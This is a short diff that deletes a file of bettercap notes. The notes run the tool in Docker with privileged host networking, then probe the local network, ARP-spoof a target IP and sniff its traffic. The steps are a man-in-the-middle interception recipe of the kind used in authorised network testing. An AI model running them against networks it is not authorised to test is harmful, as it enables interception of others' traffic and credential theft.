@@ -1,9 +1,0 @@
-docker run -it --privileged --net=host   -v bettercap:/usr/local/share/bettercap   bettercap/bettercap -caplet http-ui
-
-net.probe on
-net.show 
-// monitor
-set arp.spoof.targets [IP]
-arp.spoof on 
-net.sniff on
-
